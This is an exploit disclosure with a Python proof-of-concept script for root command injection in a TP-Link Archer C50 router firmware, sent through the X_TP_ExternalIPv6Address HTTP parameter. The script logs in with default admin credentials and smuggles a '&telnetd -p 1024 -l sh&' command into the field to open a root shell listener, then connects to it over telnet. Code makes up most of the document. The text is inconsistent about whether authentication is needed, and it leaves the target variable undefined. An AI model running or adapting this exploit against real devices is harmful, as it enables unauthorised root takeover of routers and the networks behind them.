# Archer_C50
Exploit Author: yangchunyu@whu.edu.cn

Vendor: TP-Link

Firmware: Archer_C50(TW)_V1_160614

There is remote authenticated OS command injection on TP-Link Archer C50 devices vie the X_TP_ExternalIPv6Address HTTP parameter, allowing a remote attacker to run arbitrary commands on the router with root privileges.

Perform command concatenation on the X_TP_ExternalIPv6Address parameter in the HTTP POST message, the unauthenticated remote attacker can execute the shell command.

The similar vulnerability already exists with CVE-2021-44827.

# poc
import requests
import base64
import os
import time

ip = targetIPAddress
username = "admin"
password = "admin"
tplink_url = "http://" + ip + "/cgi?2&2"
userinfo = username + ":" + password
cookie = "Authorization=Basic " + base64.b64encode(userinfo.encode()).decode("ascii")
referer = "http://" + ip +"/mainFrame.htm"
cmd = "telnet " + ip + " 1024"
payload_template = """[WAN_ETH_INTF#1,0,0,0,0,0#0,0,0,0,0,0]0,1\r
X_TP_lastUsedIntf=ipoe_eth3_s\r
[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]1,21\r
externalIPAddress=192.168.9.222\r
subnetMask=255.255.255.0\r
defaultGateway=192.168.9.2\r
NATEnabled=1\r
X_TP_FullconeNATEnabled=0\r
X_TP_FirewallEnabled=1\r
X_TP_IGMPProxyEnabled=1\r
X_TP_IGMPForceVersion=0\r
maxMTUSize=1500\r
DNSOverrideAllowed=1\r
DNSServers=192.168.9.3,0.0.0.0\r
X_TP_IPv4Enabled=1\r
X_TP_IPv6Enabled=0\r
X_TP_IPv6AddressingType=Static\r
X_TP_ExternalIPv6Address=commond\r
X_TP_PrefixLength=64\r
X_TP_DefaultIPv6Gateway=::\r
X_TP_IPv6DNSOverrideAllowed=0\r
X_TP_IPv6DNSServers=::,::\r
X_TP_MLDProxyEnabled=0\r
enable=1\r
"""
payload = payload_template.replace("commond", "::")
res = requests.post(tplink_url, data=payload, headers={"Referer": referer, "Cookie": cookie})
time.sleep(5)
payload = payload_template.replace("commond", "&telnetd -p 1024 -l sh&")
res = requests.post(tplink_url, data=payload, headers={"Referer": referer, "Cookie": cookie})
os.system(cmd)
